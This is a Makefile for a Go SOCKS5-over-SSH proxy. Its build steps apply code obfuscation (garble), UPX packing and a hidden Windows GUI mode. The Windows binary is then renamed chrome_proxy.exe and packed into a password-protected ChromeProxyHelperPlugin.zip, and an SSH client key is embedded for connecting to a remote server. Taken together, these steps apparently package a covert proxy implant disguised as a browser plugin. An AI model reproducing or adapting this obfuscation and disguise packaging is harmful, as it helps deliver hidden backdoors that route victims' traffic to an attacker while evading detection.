SOURCES=Makefile main.go main_release.go main_debug.go config.go config_release.go config_template.go 
GARBLE_BIN = $(shell go env GOPATH)/bin/garble
GARBLE_CMD = $(GARBLE_BIN) -literals -tiny

all: socks5-ssh-proxy

ci: release
release: socks5-ssh-proxy.release socks5-ssh-proxy.exe
	mkdir -v -p dist
	cp -v $^ dist

test: socks5-ssh-proxy
	cp socks5-ssh-proxy ~/.ssh; cd ~/.ssh; ~/.ssh/socks5-ssh-proxy
test-release: socks5-ssh-proxy.release
	./socks5-ssh-proxy.release
socks5-ssh-proxy: $(SOURCES) 
	go build -o $@
socks5-ssh-proxy.release: resources $(SOURCES) $(GARBLE_BIN)
	GOOS=darwin GOARCH=amd64 $(GARBLE_CMD) build -tags release -o $@
	upx $@
win: socks5-ssh-proxy.exe
socks5-ssh-proxy.exe: resources $(GARBLE_BIN) $(SOURCES)
	GOOS=windows GOARCH=amd64 $(GARBLE_CMD) build -ldflags -H=windowsgui -tags release -o $@
	upx $@
goreleaser: resources $(GARBLE_BIN)
	goreleaser build --clean --snapshot --id win-release
win-package: ChromeProxyHelperPlugin.zip
ChromeProxyHelperPlugin.zip: socks5-ssh-proxy.exe
	cp socks5-ssh-proxy.exe chrome_proxy.exe
	upx chrome_proxy.exe
	zip -eP resistanceIsFutile ChromeProxyHelperPlugin.zip chrome_proxy.exe
	rm -f chrome_proxy.exe
install-deps: $(GARBLE_BIN)
$(GARBLE_BIN):
	go install mvdan.cc/garble@v0.12.1
clean:
	rm -f *.exe
	rm -f *.zip
	rm -f socks5-ssh-proxy
	rm -f socks5-ssh-proxy.release
clean-all: clean clean-key
clean-key:
	rm -f resources/ssh*

config_release.go:
	cp config_template.go $@
	sed -i '' 's/!release/release/g' $@
config_release.go.base64: config_release.go
	base64 -i $< -o $@

resources: resources/ssh_private_key
resources/ssh_private_key:
	ssh-keygen -q -t ecdsa -b 521 -N "" -C "socks5-ssh-proxy-client@$(shell date +"%Y-%m-%d+%H:%M:%S")" -f $@
	@echo "NOTICE: Add the new key to the server"
	@echo "====================================="
	@cat $@.pub
	@echo "====================================="
resources/ssh_private_key.base64: resources/ssh_private_key
	base64 -i $< -o $@

secrets: config_release.go.base64 resources/ssh_private_key.base64

.phony: clean test win
